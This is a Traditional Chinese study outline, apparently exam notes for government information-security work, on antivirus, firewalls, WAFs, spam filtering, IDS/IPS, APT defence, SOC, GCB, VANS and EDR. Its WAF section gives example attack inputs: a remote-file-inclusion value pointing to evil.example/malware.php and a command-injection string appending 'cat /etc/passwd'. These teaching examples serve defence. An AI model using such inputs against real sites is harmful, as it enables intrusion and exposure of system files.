- 「防毒軟體」之安全防護
	- 清除各種惡意程式
		- 病毒
			- 感染 其他合法程式或檔案
		- 蠕蟲
			- 透過 網路 自我複製與傳播
		- 間諜軟體
			- 監控 使用者行為、竊取 個人資訊 並秘密傳送
		- 後門程式
			- 繞過 正常身分驗證機制
			- 遠端控制 受感染的系統
		- 木馬程式
			- 偽裝成 合法軟體
			- 誘騙 使用者 下載並執行
	- 惡意程式的來源
		- 電子郵件
		- USB 硬碟
		- 網站瀏覽
		- 即時通訊
		- 檔案傳輸 / 分享
	- 防毒軟體 - 部署方式
		- 個人電腦與伺服器防毒
		- 電子郵件防毒閘道
			- 網路邊界 (DMZ 網段 ) 部署 電子郵件防毒閘道( 如 SMTP AntiVirus)。
			- 郵件 進入內部網路 前  對所有進出郵件 進行掃描及過濾
			- 有效阻擋郵件惡意程式。
		- 上網防毒閘道
			- 內部網路 與 網際網路間 部署 上網防毒閘道(如 HTTPS/FTP/POP3AntiVirus)
			- 監控並掃描 所有透過 HTTPS、FTP、POP3 等協定 的網路流量
			- 在 使用者 瀏覽網頁或下載檔案 時  即時阻擋惡意內容
			- 與 電子郵件防毒閘道 類似
		- 防毒軟體- 部署說明
			- 整體架構
				- 防火牆作為第一道防線 過濾下列
					- 外部流量
					- DMZ 作為緩衝區隔離對外服務
				- 內部網路中部署額外的安全掃描（如防毒伺服器）
			- 非軍事區(Demilitarized Zone, DMZ)
				- 專門放置 需要對外部網路提供服務 的伺服器
				- 即使DMZ 內的伺服器被攻擊，攻擊者仍需再次突破防火牆
				- SMTP AntiVirus 伺服器
					- 主要負責處理組織的電子郵件(SMTP)，並對其進行病毒掃描
			- 內部網段
				- HTTPS/FTP/POP3 AntiVirus 伺服器
					- 網頁瀏覽(HTTPS)、檔案傳輸(FTP) 及收到的電子郵件(POP3)
					- 進行病毒及惡意軟體掃描
		- 防毒軟體- 管理重點
			- 定期 自動更新病毒碼
			- 病毒感染 事件與趨勢 定期分析
				- 定期檢視防毒軟體日誌
				- 了解感染類型、來源與數量
				- 調整資安策略
			- 避免 未安裝防毒軟體 的電腦上線（配合NAC 設備）
				- 應導入 網路存取控制 (NAC)，強制檢查 設備 是否符合安全規範
			- 防火牆 控管 未經防毒閘道過濾 的連線行為
				- 應確保 所有關鍵流量（如郵件、網頁下載）必須先經 防毒閘道 掃描過濾
			- 採用不同廠牌
				- 「個人電腦與伺服器防毒系統」與「防毒閘道系統」不同廠牌，以增加防護的多樣性
		- 選購考量
			- 病毒偵測的精準度
				- 應關注 偵測率與誤報率，參考 第三方獨立測試報告
			- 對電腦效能的影響
				- 不應過度佔用系統資源
			- 是否提供中央控管機制
				- 中央控管機制應能統一派送更新、設定策略、監控各端點狀態及處理事件

- 「網路防火牆」之安全防護
	- 主要用途
		- 區隔不同安全等級網段
			- 外部網路(Internet)
			- 內部網路(LAN)
			- DMZ區(Demilitarized Zone)
				- 放置對外服務的伺服器(如網站、郵件伺服器)
		- 過濾資料封包
			- 精準控制資料封包的來源 IP、目的 IP、通訊埠號 (Port) 及協定 (Protocol) 等資訊
		- 提供稽核與控制存取網路資源
			- 詳盡的日誌記錄功能
			- 透過分析調整防火牆規則，強化安全策略
		- 網路防火牆-部署說明
			- 外部流量過濾
				- 首先會經過路由器（core switch），然後到達防火牆
			- 防火牆的嚴格控制
				- 只允許經過明確許可的服務 (HTTPS 及 Mail) 進入 DMZ
			- DMZ的隔離作用
				- 公開服務(郵件及網站)被放置在DMZ中
			- 內部網路的保護
				- 內部網路 與 DMZ及網際網路 嚴格分離
	- 部署方式
		- 考量資安需求，妥善劃分 IP網段 與 虛擬區域網路
			- 劃分為不同的 IP 網段(如財務部門、研發部門、來賓網路等)
			- 利用「虛擬區域網路 (VLAN)」技術進一步隔離不同部門或不同性質的流量
			- VLAN 是第二層的實際隔離；IP 網段是第三層的位址與路由劃分
				- 為什麼只改 IP，不能進入其他 VLAN？
					- 因為 **IP 是第三層位址，VLAN 是交換器在第二層依連接埠或標籤決定的，所以改 IP 不會改變所屬 VLAN**
				- 通常 一個 VLAN 對應 一個 IP 網段
			- 限制橫向移動
		- 建置2台防火牆並設定成高可靠度(High Availability)運作模式
	- 管理重點
		- 防火牆存取規則的變更管理程序
			- 變更申請、核准及記錄
		- 防火牆存取紀錄的即時匯出與保留
			- 應設定防火牆將存取日誌「即時匯出」到 安全的集中式日誌伺服器
			- 保留足夠長度的時間
		- 定期產出異常存取統計分析報表
			- 定期分析 異常連線次數或被阻擋的惡意流量
			- 從被動防禦轉為主動應變
		- 防火牆存取控管規則定期盤查
			- 定期「全面審查所有規則」(例如 A 級機關每年 1 次，B 級機關兩年 1 次)
	- 選購考量
		- 防火牆本身的安全性
			- 產品安全更新頻率、是否經過第三方認證
		- 可區隔的網路區段數
			- 是否支援「足夠的實體網路埠數量」
		- 可支援的傳輸頻寬大小
			- 「吞吐量」直接影響網路速度

- 「應用程式防火牆」之安全防護
	- 角色及運作原理
		- 網站應用程式防火牆 (Web Application Firewall, WAF)
		- 針對「應用層封包」進行管控
			- SQL Injection
				- 試圖透過惡意 SQL 語句來操控或竊取資料庫內容
			- Cross-Site Scripting
				- 網頁中注入惡意腳本來竊取使用者資料或劫持會話
			- 還能防禦如路徑遍歷、遠端檔案包含、命令注入等 OWASP Top 10 中列出的其他應用層威脅
				- 路徑遍歷
					- 攻擊者利用 `../` 等路徑符號，跳出網站原本允許存取的資料夾，讀取其他檔案
				- 遠端檔案包含
					- 網站程式把使用者指定的「遠端網址」當成程式檔載入並執行
						- page = https ://evil.example/malware.php
					- 若載入的是伺服器本機檔案，則稱為 **本機檔案包含（LFI）**
				- 命令注入
					- 網站把使用者輸入直接接到作業系統指令中執行，攻擊者便可插入額外命令
						- 192.168.1.1
							- ping 192.168.1.1
						- 192.168.1.1; cat /etc/passwd
							- ping 192.168.1.1 
							- cat /etc/passwd
		- 傳統網路防火牆
			- 網路層與傳輸層的 IP/Port 過濾
	- 偵測與過濾技術
		- 白名單(Whitelist)
			- 只允許列在白名單的網頁與參數通過，其他一律拒絕
		- 黑名單(Blacklist)
			- 列在黑名單的網頁與參數一律拒絕
		- 攻擊特徵判斷 (Signature-based Detection)
			- 目前較常用的作法，基於龐大的已知攻擊特徵碼資料庫
	- 類型與部署方式
		- 硬體式(Appliance-based)WAF
			- 獨立的專用硬體設備
			- 對後端 Web 伺服器效能影響小，部署相對簡單
			- 高性能與高吞吐量
			- 通常在 網際網路流量 進入 實際的 Web 伺服器群組 之前，扮演「反向代理」角色
		- 軟體式(Software-based)WAF
			- 安裝在Web伺服器上，作為應用程式或模組
			- 部署彈性高
				- 逐一配置及維護，複雜度會增加
			- 成本相對較低，與應用程式整合度高
				- 與Web伺服器共享資源，可能對伺服器效能造成影響
	- 管理重點
		- 存取規則的變更管理
			- 變更申請、核准及記錄
		- 異常網站應用程式攻擊事件的匯出與分析
			- 異常事件應立即匯出 並 保留足夠時間，定期分析
	- 選購考量
		- 處理效能
		- 中文URL及傳輸內容的判斷能力
		- HTTPS加密連線的解密與過濾能力
			- 確保加密流量中的威脅也能被有效防禦

- 「電子郵件過濾機制」之安全防護
	- 用途
		- 過濾垃圾與廣告郵件
		- 避免電子郵件社交工程攻擊
	- 垃圾郵件判斷技術
		- 連線模式
			- 寄件伺服器的IP位址、連線頻率、連線行為模式(例如，來自已知惡意 IP 位址的連線、或在短時間內發送大量郵件的伺服器)
		- 關鍵字比對
		- 內容過濾條件
			- 郵件的格式、標頭資訊、附件類型等
		- 外部資料庫比對
			- 比對
				- 寄件者的IP位址、網域名稱 或 郵件內容雜湊值
				- 外部的黑名單資料庫(如 RBL, Real-time Blackhole List)
		- 貝氏演算法 (Bayesian Algorithm)
			- 分析大量 垃圾郵件 及 正常郵件 的詞彙頻率，建立判斷模型
		- 圖片辨識技術
	- 部署方式
		- 匣道模式(Mail Relay)
			- 改變原有網路拓樸及 IP 設定，設備僅進行監聽及過濾
			- 不影響其他網路流量，因其只處理郵件流量
			- 安全性高(Fail Close)，設備故障時信件無法進出，確保安全
		- Bridge模式(目前較少見)
			- 不 改變原有網路拓樸及 IP 設定，設備僅進行監聽及過濾
			- 會影響其他網路流量，因其處於網路路徑上
			- 安全性低(Fail Open)，設備故障時會自動 Bypass 流量，優先確保網路連通性，但安全性暫時降低
	- 管理重點
		- 定期自動更新垃圾郵件辨識特徵碼
		- 電子郵件過濾規則的變更管理程序
	- 選購考量
		- 垃圾郵件判斷的精準度
		- 處理效能
		- 中文信件或多國語言的支援能力
		- 全文檢索支援能力
		- 圖片廣告信件的支援能力

- 「IDS 與 IPS」之安全防護
	- 用途
		- 識別異常與攻擊行為
		- IPS阻擋
			- 一旦識別到「特定的攻擊行為」，可以立即採取「阻擋」動作，例如中斷惡意連線或丟棄惡意封包
		- SSL/TLS加密連線限制
			- IDS/IPS在未進行解密的情況下，無法識別 SSL 加密連線(如 HTTPS、SMTPS、FTPS 等)中的內容
	- 技術類型
		- 特徵碼比對(Signature-based Detection)
			- 比對攻擊特徵碼
			- 系統內建一個龐大的已知攻擊模式資料庫(如病毒碼、蠕蟲特徵、特定攻擊指令序列)
			- 只能偵測已知攻擊
			- 「零日攻擊 (Zero-day attack)」，則無法有效偵測
		- 異常行為模式分析(Anomaly-based Detection)
			- 不依賴已知特徵碼
			- 統計分析(基準) 比對出 異常行為
			- 偵測未知類型攻擊
			- 相對「容易誤判」。若正常行為模式發生變化(例如新增服務、大量正常流量湧入)，可能被誤判
		- 狀態協定分析(Protocol Anomaly Detection)
			- 事先定義「完整且正確的通訊協定行為規範」
			- 任何「違反協定規範的行為」都會被視為異常或潛在攻擊
			- 「較為精準」，且能有效「偵測未知類型攻擊」
			- 通常「耗費較多運算資源」，因為需要 深度解析及維護每個通訊協定的狀態，可能「影響系統效能」，對硬體要求較高
	- 反應方式
		- 被動方式(IDS)
			- 只將異常事件記錄下來，並發出警報(如郵件、SNMP Trap)，供管理員日後稽核分析使用
		- 主動方式(IPS)
			- 偵測到攻擊事件後，會立即採取行動，如阻斷惡意連線、丟棄惡意封包或重置 TCP 連線
	- 部署方式
		- 監聽模式(IDS)
			- 部署在 網路交換機的 Port Mirroring 埠
			- 被動地 監聽網路流量副本
			- 優點是 不影響網路部署，且幾乎不影響網路效能
			- 缺點是 無法主動阻擋攻擊
		- Bridge模式(IPS)
			- 串接 在網路路徑中，成為流量的 必經之路
			- 優點是 能即時阻擋惡意流量
			- 缺點是 如果 IPS 設備故障，則可能造成網路服務中斷
	- 部署位置
		- 通常建議部署在 DMZ 區與內部網路的 進出口
		- DMZ網段 進出口
			- 部署IDS/IPS可監
		- 內部網路 進出口
			- 監控
				- 內部網路 之間 的流量
				- 內部網路 對外 的連線
			- 有助於偵測
				- 內部威脅(如惡意程式擴散)
				- 橫向移動攻擊
				- 內部主機對外發起的惡意連線(如殭屍網路活動)
	- IDS與IPS之差異比較
		- 監控方式
			- IDS(被動)
				- 只負責監聽網路流量的副本
			- IPS(主動)
				- 會串接在網路流量的路徑中
		- 反應能力
			- IDS(僅報告)
			- IPS(自動防禦)
		- 部署位置
			- IDS(網路邊緣或主機)
			- IPS(內聯於網路流量中)
				- 通常是在網路閘道、防火牆後方
		- 誤報風險
			- IDS(較低)
				- IDS只負責告警不阻斷，即使發生「誤報」，也僅是發出錯誤的警報，不會直接影響正常網路服務的運作
			- IPS(較高)
				- IPS一旦「誤判」，可能會「阻擋正常的網路流量」，導致合法的服務中斷
		- 即時防護
			- IDS(無)
			- IPS(有)
	- 選購考量
		- 精準之特徵碼資料庫
			- 深度防護
				- 特徵碼資料庫 不僅 針對「特定攻擊」編寫，更要具備 針對「軟體弱點」的防護能力
			- 降低誤報漏判
				- 直接影響系統的 可用性與安全性
		- 效能能經過實測
			- 避免瓶頸
				- 特別是IPS，是串接在網路流量中的關鍵點
				- 「處理效能(吞吐量、每秒連線數)」必須能夠承受機關的「實際網路流量與尖峰負載」
				- 選購前，務必要求廠商提供「實際的效能測試數據」，或進行概念驗證 (PoC)，確保其性能符合需求
		- 針對 DoS/DDoS攻擊 能分辨 合法封包與攻擊封包 之差異
		- 報表系統、中央管理機制及IM/P2P管理能力
			- 報表與管理
				- 完整且彈性的報表系統
				- 快速了解威脅態勢、偵測記錄及防護效果
				- 中央管理機制
					- 統一管理、部署規則、監控多個設備
			- 應用層管理
				- 即時通訊(IM)及P2P軟體 可能被用作 傳播惡意程式 或 資料外洩的途徑
				- 應用層協定的識別與管理能力
					- 阻擋惡意 P2P 流量或監控 IM 中的可疑行為

- 「APT」之攻擊防禦措施
	- 主要的攻擊特色
		- 持續性
		- 針對性
		- 隱蔽性
		- 複合性
	- APT 防禦措施
		- 用途
			- 增強組織抵禦APT 攻擊的整體能力
				- 其防禦無法僅依賴單一技術或產品
				- 系統性工程
					- 多層次防護、情資分析、事件應變、持續監控
				- 「全面性地提升」組織在面對APT 時的防禦、偵測、應變與復原能力
			- 降低 APT 攻擊造成的風險及損害
				- APT 攻擊可能導致資料竊取、系統破壞、業務中斷等
				- 在攻擊發生時「最小化其造成的風險與損害」
		- 部署方式
			- 多層次 安全防護：結合網路、端點及應用層面的安全控制措施
				- 「網路層面」（如防火牆、IPS、WAF)
				- 「端點層面」（如防毒軟體、EDR)
				- 「應用層面」（如網站應用程式安全）
			- 持續的威脅情報收集及分析：監控APT攻擊趨勢及手法
				- APT 攻擊趨勢、常用的攻擊手法、惡意程式特徵等「威脅情報」至關重要
				- 情報來源
					- 安全資訊及事件管理 (Security Information and Event Management, SIEM)系統
					- 安全協同、自動化與回應(Security Orchestration, Automation and Response, SOAR) 系統
			- 完善的事件應變機制：建立快速檢測、遏制及修復的程序
				- 建立一套「完整且可操作的資安事件應變計畫 (IRP)」
				- 快速的「檢測」（發現攻擊）
				- 有效的「遏制」（限制攻擊範圍）
				- 、即時地「修復」（恢復受影響系統）
			- 持續監控及適應性調整：依據威脅變化不斷優化防禦策略
		- 管理重點
			- 確保 多層次安全防護的 全面性及協同性
				- 整合而非堆疊
			- 持續更新及分析最新的威脅情報
			- 確保 事件應變流程的 高效性及可靠性
				- 定期演練
			- 建立靈活的監控及調整機制
				- 持續改進

- 「SOC」管理機制
	- SOC 監控範圍包括：以A 級公務機關為例
		- 端點偵測及應變機制(EDR)
		- 防毒軟體(Antivirus)
		- 網路防火牆(Firewall)
		- 電子郵件過濾機制
		- 入侵防禦及偵測機制(IDS/IPS)
		- 應用程式防火牆(WAF)
		- 進階持續性威脅攻擊防禦措施(APT)
		- 目錄服務系統
			- 監控如Active Directory (AD) 的帳號登入、權限變更、群組異動等日誌，防止 身分與存取層面 的攻擊。
		- 核心資通系統之 資通設備紀錄 及 資訊服務或應用程式紀錄
	- 協助機關提升資安監控的有效性
		- 7x24 全天候監控服務
		- 即時告警
		- 追蹤分析與應變處理
		- 定期提供網路威脅分析統計報表
		- 監控與網路同步運作
		- 搭配全球預警、威脅情資等服務及專屬事件追蹤平台
	- 資通安全威脅偵測聯防機制
		- 三層聯防架構
			- N-SOC（國家資通安全監控中心）
				- 協助制定 領域資安威脅情蒐規範
				- 掌握各領域整體資安現況及趨勢
				- 研判緊急資安事件
			- 領域SOC（產業或特定領域的資安監控中心）
				- 收整單位資安防護狀況
				- 掌握領域整體資安現況及趨勢
				- 研判與通知緊急資安事件
			- CI提供者SOC（關鍵基礎設施提供者或個別企業的SOC)
				- 建置相關資安防護機制
				- 情資蒐集與情資分析
				- 建構情資上報機制

- 「GCB」組態基準
	- 組態管理
		- 組態 (Configuration)
			- 為 IT 系統的邏輯模型
				- 服務、軟體、硬體、設定、文件及 IT 人員等 組態項目(Configuration Item, CI)
			- 組態項目間 有 互動與關聯性
				- 一個應用程式（軟體 CI) 需要特定的伺服器（硬體CI) 及網路設定（設定CI) 才能運行
		- 組態管理目標
			- 識別、控制、維護及檢查 IT 系統中所有的組態元件及其之間的關聯性
				- IT資產管理
				- 提供IT服務管理作業中所需的精確資訊
			- 確保 IT 環境的穩定性、一致性、安全性及合規性
			- 降低 因變更對系統 造成的 各類負面影響
		- 組態管理資料庫 (Configuration Management Database, CMDB)
			- 儲存最新 IT 系統 所有組態項目及其關聯性的資料庫。
			- 儲存形式可以是 文件、檔案或關聯式資料庫
		- 透過「變更管理」維護IT 系統的組態現況
		- 變更管理項目
			- 記錄變更內容與過程
			- 評估變更的衝擊、成本、效益、資源需求及風險
			- 取得授權與核准
			- 管理與協調變更的實作
			- 變更實作監督與回報
		- 變更CMDB 以反映變更後現況
		- 當IT 系統之組態變更時，應考量對系統營運的安全影響
		- 變更前應釐清組態項目的關聯性
	- 政府組態基準(GCB)
		- 規範資通訊設備（如：個人電腦、伺服器主機及網通設備等）的一致性安全設定（如：密碼長度、更新期限等）
		- GCB 的導入是 A 級與 B 級公務機關必須辦理的事項
		- 效益
			- 發展一致性安全組態設定
				- 消除因設定不一致導致的資安漏洞，提高整體防護水準
			- 提升資通訊設備之資安防護
		- GCB 之類別及項目
			- 旨在為 關鍵資通訊設備 提供 一致的安全配置標準
			- 四類主要設備類別
				- 網通設備 (Network Devices)
					- 確保網路基礎設施的安全配置，防止未經授權的存取
				- 作業系統 (Operating Systems)
					- 規範作業系統的安全設定，如帳戶密碼策略、服務啟用、系統日誌配置等
				- 應用程式 (Applications)
					- 伺服器端 或 使用者端 運行的關鍵應用程式，如 Exchange（郵件伺服器）、IIS（網頁伺服器）、SQL Server（資料庫伺服器）、Apache HTTP Server 及 Office 辦公軟體等
					- 確保這些應用程式本身及其相關配置符合安全規範，防範應用層漏洞被利用
				- 瀏覽器 (Browsers)
					- 涵蓋主流的網頁瀏覽器
					- 目的在於規範瀏覽器的安全設定，如安全性區域設定、彈出視窗阻擋、插件管理等
					- 免受惡意網站和網路釣魚的侵害

- 「VANS」通報機制
	- 資安弱點通報機制(Vulnerability Analysis and NotificationSystem, VANS) 
		- 結合 資訊資產管理 與 弱點管理
		- 資產清冊建立
		- 弱點比對
		- 即時發現和修補弱點，降低重大資安事件的發生機率和損害
	- VANS 提供的服務
		- 持續維護 資訊資產盤點資料
		- 系統化風險評估
			- 對 機關登錄的資訊資產項目 進行 弱點比對
			- 依據 已知弱點資料庫 識別 資產中存在的潛在安全漏洞
		- 即時提醒與修補作業
			- 依據 機關所訂定之風險值門檻，即時提醒 資訊資產風險情形，並進行 弱點評估與修補作業
		- 微軟安全性 更新檢測報告 解析功能
			- 自動化方式 檢視 安全性更新落實程度
			- 確保 所有補丁都已正確安裝
			- 減少 因更新不及時造成的 安全漏洞
	- VANS 資訊資產涵蓋範圍
		- 應用軟體資產
			- Adobe 系列軟體、MySQL、Office等
		- 應用框架/ 程式語言
			- Java 的Struts2、PHP、.NET 等
		- 應用程式中介軟體(Middleware)
			- 支撐層，連接 作業系統 與 應用程式
			- Microsoft IIS、Apache Tomcat 等
		- 作業系統

- 「EDR」偵測及應變機制
	- 用途：EDR 系統的核心用途在於 全面保護組織的端點設備
		- 偵測與阻擋威脅
			- 能識別更複雜的攻擊行為，包括無檔案攻擊、勒索軟體、零日漏洞利用和 APT 攻擊。
				- 無檔案攻擊
					- 利用Windows既有工具，把惡意行為放在記憶體或系統設定中執行，以躲避只掃描檔案的傳統防毒。
		- 確保端點設備安全
			- 持續監控端點活動、收集數據並進行分析
	- 技術類型：EDR 系統 結合多種技術 來實現 高效的偵測與應變
		- 行為分析
			- 端點上的所有進程、檔案操作、網路連線、登錄檔變更等行為
		- 規則比對
			- 與 已知的「惡意行為規則集」（例如，特定的API 呼叫序列、惡意檔案雜湊值）進行比對
		- 黑白名單
	- 選購考量：選購EDR 系統時，應考慮以下關鍵因素
		- 偵測威脅的精準度
			- 「誤報率」及「漏判率」
		- 與防毒軟體整合
			- 與 現有的防毒軟體 或 次世代防毒(NGAV) 進行良好整合
				- 次世代防毒(NGAV) 
					- 採用 機器學習及行為分析技術 的進階防毒解決方案
		- 系統呈現的攻擊事件資訊詳盡且易於判讀
